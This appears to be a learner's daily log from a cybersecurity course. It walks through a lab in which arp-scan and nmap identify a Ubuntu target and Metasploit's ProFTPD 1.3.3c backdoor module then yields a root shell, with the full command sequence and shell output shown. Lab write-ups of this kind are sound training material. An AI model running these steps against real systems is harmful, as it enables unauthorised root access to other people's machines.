# 🛡️ Day 12: Cyber Security – Metasploit and Backdoor Exploitation

## 🔍 About Metasploit
Metasploit is a powerful penetration testing framework used for developing and executing exploit code against remote target machines. It provides security researchers and ethical hackers with tools to:
- Discover vulnerabilities
- Develop exploits
- Conduct post-exploitation
- Maintain access

## ⚙️ How to Use Metasploit
1. **Launch Metasploit Framework**:
   ```bash
   msfconsole
   ```

2. **Search for Exploits**:
   ```bash
   search <service-name>
   ```

3. **Select an Exploit Module**:
   ```bash
   use exploit/path/to/module
   ```

4. **Set Parameters**:
   ```bash
   set RHOST <target-ip>
   set RPORT <target-port>
   set PAYLOAD <payload-type>
   set LHOST <your-ip>
   set LPORT <your-port>
   ```

5. **Run the Exploit**:
   ```bash
   exploit
   ```

## 🎯 Target Identification and Exploitation

### Step 1: IP Discovery using `arp-scan`
To identify the IP addresses on the network:
```bash
sudo arp-scan --interface=eth0 --localnet
```
- Identified target (Ubuntu system): `192.168.1.105`
- Attacker (Kali system): `192.168.1.102`

### Step 2: OS Detection using Nmap
```bash
sudo nmap -O 192.168.1.105
```
- Operating System: Ubuntu Linux

### Step 3: Scan for Open Ports
```bash
nmap -sV 192.168.1.105
```
- Port 21 (FTP) was open.

### Step 4: Launch Metasploit and Set Exploit
```bash
msfconsole
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOST 192.168.1.105
set RPORT 21
set PAYLOAD cmd/unix/interact
exploit
```

### ✅ Successfully Gained Access
After executing the exploit, we successfully got a remote shell to the target Ubuntu system from the Kali terminal.

```
[*] Command shell session 1 opened (192.168.1.102:4444 -> 192.168.1.105:21)
id
uid=0(root) gid=0(root) groups=0(root)
```

## ✅ Summary
- Used `arp-scan` and `nmap` for network and OS identification.
- Found vulnerable FTP service on port 21.
- Exploited using Metasploit `proftpd_133c_backdoor`.
- Successfully gained root shell access on the Ubuntu system from Kali.

> ⚠️ **Important**: Always use tools like Metasploit in controlled lab environments for ethical hacking and training purposes only.

---

*Date Logged: 2025-06-28*
